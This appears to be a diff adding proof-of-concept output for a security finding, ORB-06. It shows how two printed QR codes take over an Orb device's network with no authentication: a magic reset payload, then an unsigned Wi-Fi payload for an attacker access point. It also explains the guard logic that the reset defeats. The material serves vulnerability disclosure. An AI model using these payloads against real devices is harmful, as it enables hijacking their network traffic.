@@ -1,0 +1,26 @@
+=== ORB-06 PoC: unauthenticated Orb network takeover via QR ===
+
+step 1 — QR payload: "magic_action:reset_wifi_credentials"
+         parsed as : Some(ResetWifi)
+         => accepted. No signature, no MAC, no operator credential, no
+            nonce, no shared secret. The whole payload is a public
+            constant that appears in orb-core's own unit tests.
+
+step 2 — QR payload: "WIFI:T:WPA;S:ORB-EVIL-AP;P:attackerpassword;;"
+         parsed as : Credentials { auth: Wpa, ssid: "ORB-EVIL-AP", psk: Some(***), hidden: false }
+         => accepted. Standard MeCard Wi-Fi QR, also unsigned. The
+            signed NETCONFIG format exists (NetConfig::verify_signature)
+            but this path never invokes it.
+
+why step 1 matters:
+  orb-connd `apply_wifi_qr` (service/dbus.rs:107-130) refuses unsigned
+  Wi-Fi QRs when the Orb already has connectivity:
+    can_apply_wifi_qr = has_no_connectivity || within_magic_qr_timespan
+  `apply_magic_reset_qr` (dbus.rs:279-281) sets magic_qr_applied_at = now,
+  opening MAGIC_QR_TIMESPAN_MIN = 10 minutes in which that guard is void.
+  It also wipes every saved profile, so has_no_connectivity becomes true
+  on its own. Either half of the disjunction is enough.
+
+negative controls pass (unknown action rejected, SSID-less QR rejected)
+
+result: two printed QR codes, no secrets, no prior access.
